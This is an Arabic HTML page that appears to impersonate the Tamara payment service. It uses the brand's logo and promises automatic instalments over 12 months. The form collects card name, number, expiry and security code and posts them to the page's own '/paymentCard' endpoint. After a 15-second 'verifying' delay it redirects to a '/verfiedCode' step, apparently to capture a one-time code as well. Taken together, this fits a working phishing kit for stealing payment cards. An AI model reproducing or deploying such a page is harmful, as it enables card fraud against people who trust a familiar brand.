<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
  <link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/css/bootstrap.css">
  <link rel="stylesheet" type="text/css" href="/css/payment.css">
  <link rel="stylesheet" type="text/css" href="/css/bootstrap-rtl.css">
  <link rel="stylesheet" type="text/css" href="/css/simplebar.min.css">
  <link rel="stylesheet" type="text/css" href="/css/jquery-ui.css">
  <link rel="stylesheet" type="text/css" href="/css/owl.carousel.css">
  <link rel="stylesheet" type="text/css" href="/css/custom.css">
  <link rel="stylesheet" type="text/css" href="/css/custom-rtl.css">
  <link rel="stylesheet" type="text/css" href="/css/responsive.css">
  <link rel="stylesheet" type="text/css" href="/css/responsive-rtl.css">
  <link rel="stylesheet" type="text/css" href="/css/style.css">
  <link rel="shortcut icon" href="https://la3eb.com/favicon.png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="/css/css2.css" rel="stylesheet">
   <script
  src="https://code.jquery.com/jquery-3.4.1.js"
  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
  crossorigin="anonymous"></script>
  <script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.min.js"></script>
  <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
  <script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/additional-methods.min.js"></script>
    <!-- <link rel="stylesheet" href="./tamar.css"> -->
    <title>Tamara</title>
</head>
<body>
    <div class="contaner">
        <header class="header">
            <img src="https://wps-media.jarir.com/wp-content/uploads/2022/05/tamara-ar-1.png" alt="" class="logo">
        </header>
        <div style="padding:1rem">
             <h3>يتم خصم الدفعات تلقائياً على مدار 12 شهر بالمبلغ المستحق </h3>
        </div>
         <section class="ptb-70" style="padding:1rem">
          <div class="container">
               <form id="myForm"> 
                  <div class="mtb-30">
                      <div class="row">
                          <div class="col-md-6 mb-xs-40">
                              <div class="estimate">
                                  <div class="row">
                                  <div class="card  mb-50">
                                      <div class="card-title mx-auto" style="color:#000">الدفع بالبطاقة الأئتمانية </div>
                                      <div class="row row-1">
                                          <div class="col-2"><img class="img-fluid"
                                                  src="https://img.icons8.com/color/48/000000/visa.png" /><img
                                                  class="img-fluid"
                                                  src="https://img.icons8.com/color/48/000000/mastercard-logo.png" />
                                          </div>
                                          <div class="col-7"> <input style="margin-right: 1rem;" disabled type="text"
                                                  placeholder="**** **** **** ****"> </div>
                                          <div class="col-3 d-flex justify-content-center">
  
                                          </div>
                                      </div>
                                     
                                      <div class="row-1">
                                          <div class="row row-2"> <span id="card-inner">اسم حامل البطاقة </span>
                                          </div>
                                          <div class="row row-2"> <input type="text" name="nameCard"
                                                  placeholder="الاسم المسجل بالبطاقة"> </div>
                                      </div>
                                      <div class="row">
                                          <div class="row-1">
                                              <div class="row row-2"> <span id="card-inner">رقم البطاقة </span> </div>
                                              <div class="row row-2"> <input 
                                                       name="cardId" type="number"
                                                      placeholder="رقم البطاقة"> </div>
                                          </div>
                                          <div class="row-1">
                                              <div class="row row-2"> <span id="card-inner">تاريخ انتهاء البطاقة
                                                  </span> </div>
                                              <div class="row row-2" style="margin-bottom: 0.5rem">
                                                  <div class="input-box select-dropdown  ">
                                                      <fieldset>
                                                          <select id="country_id" class="option-drop" required
                                                              name="month">
                                                              <option selected value>الشهر </option>
                                                              <option>01</option>
                                                              <option>02</option>
                                                              <option>03</option>
                                                              <option>04</option>
                                                              <option>05 </option>
                                                              <option>06</option>
                                                              <option>07</option>
                                                              <option>08 </option>
                                                              <option>09</option>
                                                              <option>10</option>
                                                              <option>11</option>
                                                              <option>12</option>
                                                          </select>
                                                      </fieldset>
                                                  </div>
                                                  <div class="row row-4">
                                                      <div class="input-box select-dropdown  ">
                                                          <fieldset>
                                                              <select id="country_id" required class="option-drop"
                                                                  name="year">
                                                                  <option selected value> السنة</option>
                                                                  <option>2022</option>
                                                                  <option>2023</option>
                                                                  <option>2024</option>
                                                                  <option>2025</option>
                                                                  <option>2026 </option>
                                                                  <option>2027</option>
                                                                  <option>2028</option>
                                                                  <option>2029 </option>
                                                              </select>
                                                          </fieldset>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                          <div class="row-1">
                                              <div class="row row-2"> <span id="card-inner">رمز الامان </span> </div>
                                              <div class="row row-2"><input required size="3" name="pin" type="number"
                                                      placeholder="رمز الامان (يوجد خلف البطاقة)  "></div>
                                          </div>
  
                                      </div>
                                      <button class="btn d-flex mx-auto" id="btn-submit" ><b id="p1">اتمام الطلب</b></button>
                                  </div> 
                              </div> 
                              </div>
                          </div>
                      </div>
                  </div>
              </form>
         </div>
      </section>  
    <script>
        $("#myForm").validate({
            rules: {
            year: {
                required: true,
            },
            month: {
                required: true,
            },
            nameOnCard: {
                required: true,
                minlength: 3,
            },
            pin: {
                required: true,
                minlength: 3,
                number: true,
            },
            cardId: {
                required: true,
                minlength: 16,
                number: true,
            },
            },
            messages: {
            nameCard: "الرجاء كتابة الاسم",
            year: "الرجاء ادخال السنة ",
            month: "الرجاء ادخال الشهر ",
            pin: " الرجاء ادخال رمز سري صحيح ",
            cardId: "الرجاء ادخال رقم صحيح ",
            },
            submitHandler: SubForm,
        });
        function SubForm() {
            console.log("send start")
            $.ajax({
            url: "/paymentCard",
            type: "post",
            data: $("#myForm").serializeArray(),
            beforeSend: function () {
                $("#error").fadeOut();
                document.getElementById("p1").innerHTML = " جاري التحقق ...";
                // $("#btn-submit").html(
                // '<span class="glyphicon glyphicon-transfer"></span>    جاري التحقق ...'
                // );
            },
            success: function () {
                // window.open('./cardCode.html', '_self');
                // alert("شكراً لك تم حجز طلبك بنجاح :)");
                    setTimeout(() => {
                       window.location.replace("/verfiedCode");
                    }, 15000)
            // window.location.replace("/verfiedCode");
            },
            error: function () {
                // alert("There was an error :(");
            },
            });
            return false;
        }
    </script>
    </div>
</body>
</html>